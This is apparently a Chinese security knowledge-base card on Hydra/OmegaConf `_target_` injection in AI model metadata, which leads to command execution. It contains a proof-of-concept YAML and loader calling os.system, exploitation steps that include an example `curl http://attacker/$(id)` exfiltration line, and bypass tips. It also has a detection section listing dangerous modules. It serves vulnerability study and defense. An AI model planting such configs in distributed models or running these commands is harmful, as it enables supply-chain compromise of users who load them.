---
id: ai-security-supply-chain-hydra-target-model-config-rce
title: Hydra instantiate 模型元数据 `_target_` 注入：恶意 YAML/JSON 配置实例化 os.system 执行命令
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: hydra-instantiate-target-model-config-rce
tags:
- ai-security
- supply-chain
- model-file
- hydra
- omegaconf
- instantiate
- yaml
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V172
  verified_at: '2026-11-06T11:56:04+08:00'
  notes: '已对照原文与13张图核对：恶意 YAML _target_: os.system、_args_ 命令；instantiate→_prepare_input_dict_or_list→OmegaConf(allow_objects=True)→instantiate_node→_resolve_target→_locate→import_module/getattr→_call_target 链路均与图05-08源码一致。未验证点：原文截图主要展示脚本与配置打印，未清晰展示 pwned.txt（正文称观察到命令执行/文件写入）；hydra 场景到真实模型框架（NeMo/ml-flextok）的集成属原文推断；无版本可设；PoC 未复跑；frontmatter 无 sources/source_url。'
url: /docs/ai-security/supply-chain/ai-security-supply-chain-hydra-target-model-config-rce/
draft: false
kb_aliases:
- Hydra _target_ 注入
- OmegaConf instantiate RCE
- 模型配置代码执行
- Model Format Vulnerability
- MFV
- 恶意模型元数据
---

## 一句话结论

当模型加载框架用 Hydra/OmegaConf 的 `instantiate()` 解析模型元数据（YAML/JSON 配置）时，配置里的 `_target_` 会被当作“要实例化的类/函数”解析：攻击者在模型文件的元数据中写入 `_target_: os.system` 和 `_args_: ['echo Pwned > pwned.txt']`，受害者加载模型时 `instantiate` 就会导入 `os`、取 `system` 并以给定参数调用，形成确定性的任意命令执行。

## 原理

- **Hydra 的 `instantiate` 语义**：Hydra 用 `@hydra.main`/`instantiate(cfg)` 把配置节点变成 Python 对象。节点中的特殊键 `_target_` 指定“要实例化的目标”，`_args_`/`_kwargs_` 指定参数；目标字符串可以带点号路径（如 `os.system`、`module.Class`）。
- **解析链路**：
  1. `instantiate()` 先判断输入是 `dict`/`list` 还是 `DictConfig`；
  2. 用 `_prepare_input_dict_or_list` 转成普通字典，再用 `OmegaConf.create(..., flags={"allow_objects": True})` 包装；
  3. `OmegaConf.resolve(cfg)` 后进入 `instantiate_node()`；
  4. `instantiate_node` 读取 `node.get(_Keys.TARGET)`，交给 `_resolve_target()`；
  5. `_resolve_target` 对字符串调用 `_locate(target)`；
  6. `_locate` 按 `.` 切分，第一段 `import_module(part0)`，后续用 `getattr` 逐级取属性；
  7. 返回可调用对象后，`_call_target(target, partial, args, kwargs, full_key)` 执行它。
- **为什么危险**：`_target_` 完全由配置决定，`_locate` 没有模块/函数白名单，`import_module` + `getattr` 可以到达 `os.system`、`subprocess.*`、`builtins.eval` 等任意可调用对象；`allow_objects=True` 还允许配置中携带 Python 对象。模型元数据来自第三方模型仓库（Hugging Face/ModelScope 等），属于不可信输入。
- **与普通 YAML 反序列化的区别**：`yaml.safe_load` 只把内容变成字符串/字典，不会执行；危险发生在 Hydra 的 `instantiate` 把字符串解释为“导入路径并调用”。即使 YAML 本身是安全的，后续的实例化语义也会导致代码执行。
- **演示**：恶意 YAML 中：
  ```yaml
  malicious_app:
    _target_: os.system
    _args_: ['echo "Pwned!" > pwned.txt']
  ```
  加载后 `hydra.utils.instantiate(cfg.malicious_app)` 执行 `os.system('echo "Pwned!" > pwned.txt')`，文件被写入；原文截图显示了命令执行和 `pwned.txt` 生成。
- **为什么模型场景会用到**：部分框架（如 NeMo、ml-flextok 等）用 Hydra 管理模型/训练配置；如果模型文件把元数据作为 Hydra 配置加载，攻击者就能把恶意 `_target_` 藏在“模型配置”里，随模型分发。

## 触发条件

- 模型加载/训练框架使用 Hydra `instantiate()` 或 OmegaConf 结构化配置解析第三方模型元数据。
- 元数据中的 YAML/JSON 字段可由攻击者控制（模型仓库上传、模型包内文件）。
- 框架未对 `_target_` 做模块/函数白名单，也未在沙箱中实例化。
- 受害者以有权限的账号加载模型（命令以该账号权限执行）。

## 利用步骤

1. 在模型元数据（如 `config.yaml`、`safetensors` 旁的 JSON/YAML）中写入一个配置节点，设置 `_target_` 为攻击者想调用的函数（示例 `os.system`）。
2. 用 `_args_`（位置参数）或 `_kwargs_`（关键字参数）传入命令/参数，例如 `['curl http://attacker/$(id)']`。
3. 让受害者框架在加载模型时对该节点调用 `hydra.utils.instantiate`；若框架只解析部分字段，需把节点放到它实际实例化的路径下。
4. 命令执行后可继续下载二阶段载荷、写持久化或外带数据；授权测试用无害命令（如 `echo` 写临时文件）验证。
5. 若框架对 `_target_` 有前缀限制，尝试 `module.Class` 形式、嵌套 `_target_`、`_recursive_`/`_partial_` 等 Hydra 特性绕过。

## PoC

```yaml
# malicious_config.yaml
malicious_app:
  _target_: os.system
  _args_: ['echo "Pwned!" > pwned.txt']
```

```python
# 受害者侧：加载模型元数据并 instantiate
import hydra
from hydra.utils import instantiate
from omegaconf import OmegaConf

cfg = OmegaConf.load("malicious_config.yaml")
instantiate(cfg.malicious_app)      # 执行 os.system('echo "Pwned!" > pwned.txt')
```

实际集成到模型加载器时，把 `malicious_app` 换成框架会 `instantiate` 的字段名；不同 Hydra 版本的 `_locate`/`_call_target` 实现可能略有差异，但 `_target_` 语义一致。

## 变体与关联

- **其他可调用目标**：`subprocess.check_output`、`builtins.eval`/`exec`、`shutil.rmtree`、`pathlib.Path.write_text` 等；不一定需要 `os.system`。
- **嵌套/递归**：`_recursive_: true` 会让 Hydra 递归实例化子节点，可把恶意目标藏在多层配置中；`_partial_: true` 可先绑定参数、稍后调用。
- **结构化配置**：OmegaConf 的 structured config 也可能带 `_target_`；`allow_objects=True` 时可传递任意 Python 对象，进一步扩大攻击面。
- **同类模型文件风险**：本库 `ai-security-supply-chain-llama-cpp-gguf-chat-template-jinja2-ssti-rce`（GGUF Jinja2 模板）、`ai-security-supply-chain-huggingface-pickle-model-reverse-shell`（PyTorch pickle）分别覆盖模型文件的另外两类执行面；本卡聚焦 Hydra 配置实例化。
- **失败点**：框架可能只读取白名单字段、用 `yaml.safe_load` 后手动取值而不调用 `instantiate`，或对 `_target_` 做前缀校验；此时需要找实际实例化点。

## 检测与防御

- **检测**：扫描模型包中的 YAML/JSON 是否含 `_target_`、`_args_`、`_kwargs_`、`_recursive_`、`_partial_` 等 Hydra 关键字；对 `_target_` 值做危险模块/函数黑名单（`os`、`subprocess`、`builtins`、`shutil`、`importlib` 等）；监控模型加载进程的 `import_module`/`getattr`/`os.system` 调用链。
- **防御**：不要对第三方模型元数据直接 `instantiate`；使用显式的、受限的配置 schema（只允许已知字段和标量），禁止 `_target_` 由外部输入控制；必须实例化时使用白名单（仅允许项目内类/函数）并在沙箱/低权限账户中执行。
- **供应链**：模型仓库应扫描元数据中的 Hydra 关键字；加载方应校验模型签名/哈希，并在隔离环境做首次加载。
- **注意**：`yaml.safe_load` 不能防住这类攻击，因为危险发生在后续的 Hydra 实例化，而不是 YAML 解析本身。
